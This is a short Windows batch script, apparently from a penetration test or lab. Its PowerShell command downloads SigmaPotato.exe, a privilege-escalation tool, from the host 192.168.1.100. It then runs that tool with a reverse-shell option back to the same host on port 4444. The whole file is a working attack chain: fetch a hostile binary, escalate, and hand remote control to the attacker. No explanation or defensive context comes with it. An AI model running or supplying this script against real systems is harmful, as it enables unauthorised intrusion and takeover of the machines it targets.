
@echo off
powershell -Command "Invoke-WebRequest -Uri https://192.168.1.100/SigmaPotato.exe -OutFile SigmaPotato.exe"
SigmaPotato.exe --revshell 192.168.1.100 4444
